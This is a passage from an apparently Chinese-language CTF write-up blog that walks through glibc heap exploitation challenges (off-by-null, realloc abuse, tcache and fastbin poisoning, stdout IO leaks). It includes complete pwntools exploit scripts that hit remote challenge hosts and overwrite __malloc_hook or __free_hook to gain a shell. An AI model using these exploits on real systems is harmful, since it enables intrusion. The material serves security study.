class="comment">#确保这个_lock字段的值是正常的</span></span><br><span class="line">edit(-<span class="number">0x10</span>,<span class="number">0xf0</span>,<span class="built_in">bytes</span>(file))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220826112921840-1751167110.png" alt=""></p><h4 id="思路二：利用off-by-null">思路二：利用off_by_null</h4><p>这个思路比较常规，也比较麻烦。</p><p>主要是通过两次off by null造成两次堆块重叠，然后将unsorted bin中的fd指针写入fastbin中的fd位置。然后打fastbin attack进行io leak。最后再打fastbin attack往malloc_hook中写入one_gadget。</p><p>整体来说最麻烦的部分就是将unsorted bin中的fd指针写入fastbin中的fd位置。</p><p>这里的具体过程如下：</p><blockquote><p><strong>利用off by one(null)先打一个堆块重叠，然后在bss段上留下两个spy chunk的地址</strong>，将其中一个释放掉进入fast bin中，那么此时bss段上还有一个spy chunk的地址。但此时的unsorted bin的地址已经低于了spy chunk的地址，那就将unsorted bin中的堆块都申请回来。然后再次利用off by one(null)做一个堆块重叠，这次<strong>将merged chunk申请回来后，unsorted bin的fd指针就自然落到了spy chunk的fd指针上(别忘了此时这个堆块也位于fastbin中)，这样unsorted bin中的fd指针就落到了fast bin中</strong>，同时bss段上仍然存在一个spy chunk的地址，这样编辑该堆块就可以控制unsorted bin中的fd指针，此时的size是unsorted bin范围里的大size(无法直接将其申请出来)，此时我们应该去将merged chunk释放掉，然后unsorted bin向上合并(向低地址合并)，而原本spy chunk的fd并不会消失，然后再次申请一个len(merged chunk)+0x10+2 大小的chunk，这样往这个新chunk写入数据的时候，就可以控制spy chunk的size，顺便还能把spy chunk的fd(也就是main_arena+88)的后两字节给修改到stdout结构体上方。</p></blockquote><h4 id="EXP-v3">EXP:</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xF1B</span></span><br><span class="line">d_d=<span class="number">0xF27</span></span><br><span class="line">d_e=<span class="number">0xF3f</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input new content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input new content:&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Delete success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)<span class="comment">#merge succeeded</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#add(0x100,&#x27;a&#x27;)</span></span><br><span class="line"> </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e,0xB64)   </span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add((<span class="number">0x80</span>+<span class="number">0x10</span>+<span class="number">2</span>),p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x59</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x60&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c56a4</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    one_gadget=search_og(<span class="number">3</span>)+libc_base</span><br><span class="line">    log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29269</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220826111533151-552713986.png" alt=""></p><h2 id="TWCTF-online-2019-asterisk-alloc">TWCTF_online_2019_asterisk_alloc</h2><h3 id="收获与总结：">收获与总结：</h3><p>这道题主要就是realloc函数的妙用，学到了关于这个函数很多新知识。这个函数会根据参数的不同来实现不同的功能，具体情况如下：</p><blockquote><p>realloc(ptr,size)函数</p><p>当size不合法，比如-1时，realloc函数就会返回NULL。</p><p>当size为0且ptr存在时，就会执行free(ptr)且返回NULL</p><p>当size正常且ptr不存在时，就会执行malloc(ptr)</p><p>当size正常且ptr存在时，这就涉及到了两种情况，第一种是size大于了ptr指向堆块的size，这种情况先判断ptr指向的堆块能否与top chunk或者位于高地址且free状态的堆块合并，如果合并后二者大小满足size则进行合并。如果不能合并的话再去申请一块新的内存，将原来的数据拷贝过来，再释放之前的堆块。第二种是size小于了ptr指向堆块的size，这种情况会留下size大小的堆块，将剩余部分的堆块给释放掉。</p></blockquote><h3 id="保护策略：-v3">保护策略：</h3><p><img src="../img/2706180-20220826113015547-280603116.png" alt=""></p><h3 id="漏洞分析：-v2">漏洞分析：</h3><p><img src="../img/2706180-20220826113031894-2049890680.png" alt=""></p><p>free的时候没有将指针置空，存在UAF漏洞。当UAF配上2.27-3ubuntu1这个版本，实在是舒服至极，因为我们可以直接使用tcache dup。同时这道题保护为FULL RELRO还没有打印函数，那就可以基本确定打IO leak了。</p><h3 id="程序简单分析：">程序简单分析：</h3><p>这道题有一点点特殊，没有edit函数没有show函数。但是add函数里存在三个申请内存的函数，分别是malloc calloc realloc函数。通过观察add和delete函数的代码，发现malloc和calloc函数只能用一次，因此这道题只能将目光放到realloc函数上。realloc函数对于参数的不同，自身也有很多不同的功能（文章开始已经说明了）</p><p>这道题的核心点并不是在于怎么将unsorted bin中的fd指针给弄到tcachebin上，这一点有好几种方法都可以，难点是不太好编辑这个unsorted bin中的fd指针。这里采用的方法是申请一个大堆块A，然后再用realloc函数申请一个小堆块B(要保证A_size-B_size&gt;0x80,让其满足释放后可以进入unsorted bin的大小)，由于堆块B的size小于A，这样就保留堆块B大小的size，将堆块A的剩余部分(堆块C)释放掉。然后释放八次堆块C，这样C就进入了unsorted bin中，然后我们执行realloc(ptr_B,sizeof(堆块A))，此时的效果就是将堆块C申请回来与堆块B合并成为了堆块A，而我们的数据就可以去正常编辑原本堆块C的unsorted bin的fd指针了。</p><p>剩下就是常规操作打一个tcache dup+poisoning将free_hook申请出来最后释放掉存有/bin/sh字符串的堆块了。</p><p>整个过程就在于一个realloc函数的妙用，因为我们要不断的改变并控制ptr_r那个值，所以经常穿插将其size设置为0或者-1。</p><h3 id="调试过程：">调试过程：</h3><p>下图为free掉一个堆块八次，然后unsorted bin中的fd指针就出现到了tcachebin中</p><p><img src="../img/2706180-20220826113058600-240750503.png" alt=""></p><p>这部分的exp如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0x100</span>,<span class="string">&#x27;aaaaaaaaa&#x27;</span>)<span class="comment">#这是大堆块</span></span><br><span class="line">add_r(<span class="number">0x40</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#执行完这行代码，上面的这个大堆块就变成了0x50的可用堆块和0xc0的free状态堆块</span></span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#不过在这步的时候0x50这个堆块也被释放了</span></span><br><span class="line">add_r(<span class="number">0x20</span>,<span class="string">&#x27;prevent chunk&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>接着我们要先控制ptr_r的值为0x50堆块的那个地址，所以我们先将其申请回来，然后我们再申请0x100这个大堆块，这样realloc函数就会向下合并(向高地址合并)。</p><p><img src="../img/2706180-20220826113121671-909787527.png" alt=""><br><img src="../img/2706180-20220826113129858-1012521380.png" alt=""></p><p>因为合并后可以写入0x100的数据，因此我们就可以直接控制堆块的fd指针，将其改为stdout结构体地址。</p><p>这步的exp为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0x40</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0xc1</span>)+<span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后剩下的部分就是常规操作的tcache dup+tcache poisoning了。<strong>要注意的是需要穿插realloc(ptr_r,-1)来控制ptr_r为空，再进行realloc时才是malloc函数。否则无法正常完成tcache poisoning。</strong></p><p>剩下这部分exp为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add_m(<span class="number">0xb0</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_r(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(sys_addr))</span><br><span class="line">add_c(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最后放一下完整的exp<br><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><h3 id="EXP-v4">EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p,e,libc=load(&#x27;a&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_m</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_c</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_r</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">Which</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which: &#x27;</span>, <span class="built_in">str</span>(Which))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add_r(<span class="number">0x100</span>,<span class="string">&#x27;aaaaaaaaa&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x40</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x20</span>,<span class="string">&#x27;prevent chunk&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x40</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0xc1</span>)+<span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0xDD0,0xDD7,0xdde,0xde5)</span></span><br><span class="line">    add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_m(<span class="number">0xb0</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">    add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">    add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(sys_addr))</span><br><span class="line">    add_c(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27177</span>)</span><br><span class="line">        <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220826111557058-2083144726.png" alt=""></p><h2 id="roarctf-2019-realloc-magic">roarctf_2019_realloc_magic</h2><h3 id="保护策略：-v4">保护策略：</h3><p><img src="../img/2706180-20220826111633948-308368104.png" alt=""></p><p>这道题和上面那道题基本上一模一样，思路啥的也都一样。具体就不再放调试的图片了。具体的过程写到exp的注释里了。</p><p>一句话总结这题和上面那道题就是利用realloc向下合并的漏洞在tcachebin中踩出unsorted bin的fd指针。</p><h3 id="EXP-v5">EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#e=ELF(&#x27;./a&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/hacker/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content?\n&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#先申请一个大堆块A</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#然后realloc申请size为0的堆块，置空其指针</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#申请一个用来防止合并的小堆块</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#realloc申请size为0的堆块，置空其指针</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#因为刚才申请size为0的堆块的时候，这个堆块A被释放了，现在再申请回来</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;s&#x27;</span>)<span class="comment">#此时堆块A变成了使用状态的堆块B+空闲状态的堆块C 堆块B为0x70 堆块C为0x80</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#置空指针</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;uuuu&#x27;</span>)<span class="comment">#将堆块C申请出来</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete()</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#上面释放了堆块C七次，加上这一次，堆块C成功进入了unsorted bin中</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将堆块B申请回来</span></span><br><span class="line">    add(<span class="number">0x100</span>,p64(<span class="number">0x0</span>)*<span class="number">15</span>+p64(<span class="number">0x81</span>)+<span class="string">b&#x27;\x60\x87&#x27;</span>)<span class="comment">#利用realloc函数，向下合并空闲堆块，至此堆块A回来了，我们向堆块A写入数据就可以编辑原本堆块C的fd指针，从而将其改写为stdout结构体地址</span></span><br><span class="line">    <span class="comment">#上面步骤最核心的地方是这个0x81，本来这个位置的堆块C的实际大小为0x91，但如果我们不修改它，之后的tcache dup+tcache poisoning是没法进行的，必须要破坏它的size，才能保证下面步骤的正确进行。</span></span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0xba2,0xbae,0xA76)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#将stdout结构体申请了出来</span></span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line"></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">666</span>))<span class="comment">#清空ptr指针，因为此时的ptr指针就是stdout结构体地址，如果对这个地址进行释放的话，程序会崩溃，因此我们需要用唯一的机会将其置零</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#接下来就是重复上面的步骤 tcache dup+tcache poisoning 往free_hook中写入system地址</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete()</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x91</span>)+p64(free_hook-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span 